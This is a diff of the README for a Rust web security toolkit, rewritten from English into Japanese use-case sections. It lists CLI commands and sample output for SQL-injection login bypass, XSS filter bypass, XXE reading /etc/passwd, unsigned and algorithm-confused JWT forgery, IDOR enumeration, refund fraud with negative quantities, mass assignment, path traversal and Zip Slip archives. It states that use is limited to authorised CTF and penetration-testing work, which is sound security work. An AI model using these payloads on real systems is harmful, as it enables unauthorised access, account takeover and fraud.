@@ -1,141 +1,211 @@
 # Web Security Toolkit
 
-A comprehensive Rust-based toolkit for web security testing, CTF challenges, and penetration testing.
+Rust製の汎用Webセキュリティテストツールキット。CTF、ペネトレーションテスト、セキュリティ診断に使用できます。
 
-## Features
-
-| Module | Description | CLI Tool |
-|--------|-------------|----------|
-| **encoding** | Z85, Base64, Hex, ROT13 | `encoder` |
-| **jwt** | JWT manipulation, unsigned JWT, algorithm confusion | `jwt-tool` |
-| **sqli** | SQL injection payloads (SQLite, MySQL, PostgreSQL) | `payload-gen sqli` |
-| **xss** | XSS payloads with filter bypass techniques | `payload-gen xss` |
-| **xxe** | XXE payloads for file read, SSRF, DoS | `payload-gen xxe` |
-| **nosql** | MongoDB injection payloads | `payload-gen nosql` |
-| **traversal** | Path traversal and LFI payloads | `payload-gen traversal` |
-| **ssrf** | SSRF bypass techniques | `ssrf-scanner` |
-| **zip_payload** | Zip Slip payloads | `zip-payload` |
-| **passwords** | Common passwords, hash identification | `payload-gen passwords` |
-
-## Installation
+## インストール
 
 ```bash
 cargo build --release
 ```
 
-## CLI Tools
+バイナリは `target/release/` に生成されます：
+- `encoder` - エンコーディングツール
+- `jwt-tool` - JWT操作ツール
+- `payload-gen` - ペイロード生成ツール
+- `ssrf-scanner` - SSRFスキャナー
+- `zip-payload` - Zip Slipペイロード生成
+- `web-scanner` - Webスキャナー
+- `http-client` - HTTPクライアント
 
-### encoder
+## 使用シーン
+
+### 1. ログイン認証のテスト (SQLi)
+
+SQLインジェクションでログインをバイパスしたい場合：
 
 ```bash
-# Z85 encoding (Juice Shop coupon)
-encoder juice-coupon JAN 26 90
+# 認証バイパスペイロードを取得
+payload-gen sqli auth-bypass
 
-# Base64/Hex/Z85
+# 出力例:
+# OR 1=1              → ' OR 1=1--
+# Comment bypass      → admin'--
+# Hash comment        → ' OR 1=1#
+
+# 特定ユーザーでログインしたい場合
+payload-gen sqli login jim@example.com
+# 出力: jim@example.com'--
+```
+
+### 2. XSS脆弱性のテスト
+
+入力フィールドでXSSを試したい場合：
+
+```bash
+# 基本的なXSSペイロード
+payload-gen xss basic
+
+# フィルタバイパスが必要な場合
+payload-gen xss bypass
+
+# 出力例:
+# Double encoding     → <<script>script>alert('XSS')<</script>/script>
+# Case mixing         → <ScRiPt>alert('XSS')</sCrIpT>
+```
+
+### 3. XXE攻撃のテスト
+
+XMLアップロード機能がある場合：
+
+```bash
+# /etc/passwd を読み取るペイロード
+payload-gen xxe file /etc/passwd
+
+# 出力されるXMLをそのままアップロード
+```
+
+### 4. JWTトークンの改ざん
+
+JWT認証をバイパスしたい場合：
+
+```bash
+# 現在のトークンをデコード
+jwt-tool decode "eyJhbGciOiJIUzI1NiIs..."
+
+# 署名なしJWTを生成（alg: none攻撃）
+jwt-tool unsigned '{"data":{"email":"admin@example.com","role":"admin"}}'
+
+# アルゴリズム混乱攻撃（RS256 → HS256）
+jwt-tool hs256 '{"role":"admin"}' "公開鍵の内容"
+```
+
+### 5. IDOR（権限昇格）のテスト
+
+他のユーザーのリソースにアクセスしたい場合：
+
+```bash
+# IDの変動パターンを生成
+payload-gen idor ids 5 10
+# 出力: 1, 2, 3, 4, 6, 7, 8, ... などのIDリスト
+
+# よくあるIDORエンドポイント
+payload-gen idor endpoints
+```
+
+### 6. パラメータ改ざんのテスト
+
+APIリクエストを改ざんしたい場合：
+
+```bash
+# 負の値のテスト（料金計算などに有効）
+payload-gen tampering negative quantity 1
+
+# 出力例:
+# Original: {"quantity":1}
+# Tampered: {"quantity":-100}  ← 負の数量で返金を狙う
+
+# Mass Assignment攻撃
+payload-gen tampering mass-assignment
+
+# 出力例:
+# Original: {"email":"test@test.com"}
+# Tampered: {"email":"test@test.com","role":"admin"}
+```
+
+### 7. セキュリティヘッダーの診断
+
+Webサイトのセキュリティヘッダーをチェック：
+
+```bash
+# ヘッダーチェック（実際のサイトに対して実行）
+web-scanner check-headers https://example.com
+
+# 推奨ヘッダーを確認
+web-scanner recommended-headers
+```
+
+### 8. Cookieのセキュリティチェック
+
+```bash
+web-scanner check-cookies https://example.com
+
+# Secure, HttpOnly, SameSite属性をチェック
+```
+
+### 9. CORSの設定ミスを検出
+
+```bash
+web-scanner test-cors https://api.example.com --origin https://evil.com
+
+# オリジン反射やワイルドカード設定を検出
+```
+
+### 10. パストラバーサル
+
+ファイルアクセス制限をバイパスしたい場合：
+
+```bash
+# 様々なエンコードのペイロードを生成
+payload-gen traversal 5 etc/passwd
+
+# Null Byte攻撃を含むバリエーション
+```
+
+### 11. エンコーディング
+
+```bash
+# Juice Shopのクーポンコード生成（Z85エンコード）
+encoder juice-coupon JAN 26 90
+# Coupon: JAN26-90
+# Z85: n<Michz3{y
+
+# 各種エンコード
 encoder encode base64 "secret"
+encoder encode hex "data"
 encoder decode z85 "encoded"
 encoder rot13 "text"
 ```
 
-### jwt-tool
+### 12. Zip Slip攻撃
 
 ```bash
-# Decode JWT
-jwt-tool decode "eyJhbGciOiJIUzI1NiIs..."
-
-# Create unsigned JWT (alg: none attack)
-jwt-tool unsigned '{"role": "admin"}'
-
-# Algorithm confusion (RS256 -> HS256)
-jwt-tool hs256 '{"role": "admin"}' "public-key-content"
-
-# Juice Shop hints
-jwt-tool juice-shop
-```
-
-### payload-gen
-
-```bash
-# SQL injection
-payload-gen sqli auth-bypass
-payload-gen sqli union 9
-payload-gen sqli juice-shop
-
-# XSS
-payload-gen xss basic
-payload-gen xss bypass
-payload-gen xss juice-shop
-
-# XXE
-payload-gen xxe file /etc/passwd
-payload-gen xxe juice-shop
-
-# NoSQL
-payload-gen nosql auth-bypass
-payload-gen nosql juice-shop
-
-# Path traversal
-payload-gen traversal 5 etc/passwd
-
-# Passwords
-payload-gen passwords top
-payload-gen passwords juice-shop
-```
-
-### ssrf-scanner
-
-```bash
-ssrf-scanner localhost 3000
-ssrf-scanner internal 80
-ssrf-scanner juice-shop
-```
-
-### zip-payload
-
-```bash
-zip-payload juice-shop -o exploit.zip
+# カスタムZip Slipペイロード
 zip-payload create -o exploit.zip -t "../../etc/passwd" -c "content"
+
+# よくあるターゲットを確認
 zip-payload list
 ```
 
-## Library Usage
+## ライブラリとしての使用
 
 ```rust
 use web_security_toolkit::*;
 
-// Encoding
-let coupon = z85_encode("JAN26-90");
-
-// JWT
-let token = create_unsigned_jwt(&json!({"role": "admin"}));
-
-// SQLi
+// SQLiペイロード
 let payloads = juice_shop_sqli();
 
-// XSS
-let xss = juice_shop_xss();
+// JWT生成
+let token = create_unsigned_jwt(&json!({"role": "admin"}));
 
-// XXE
-let xxe = file_read_xxe("/etc/passwd");
+// セキュリティヘッダー分析
+let checks = analyze_headers(&response_headers);
 
-// SSRF
-let variants = generate_localhost_variants(3000);
+// IDOR ID生成
+let ids = generate_id_variations(5, 10);
+
+// パラメータ改ざん
+let tests = negative_value_tests("quantity", 1);
 ```
 
-## Testing
+## テスト
 
 ```bash
 cargo test
+# 69 tests + 12 doc tests
 ```
 
-## Supported Challenges
+## 注意事項
 
-Includes specific payloads for OWASP Juice Shop challenges:
-
-- **Authentication**: SQLi login bypass, password reset
-- **JWT**: Unsigned JWT, algorithm confusion
-- **Injection**: SQLi, NoSQLi, XXE
-- **XSS**: DOM XSS, sanitization bypass, video XSS
-- **SSRF**: Profile image URL attack
-- **File Access**: Poison null byte, Zip Slip
-- **Crypto**: Z85 coupon forgery
+- このツールは**許可されたシステム**に対してのみ使用してください
+- CTF、ペネトレーションテスト、自社システムの診断に限定
+- 不正アクセスは犯罪です
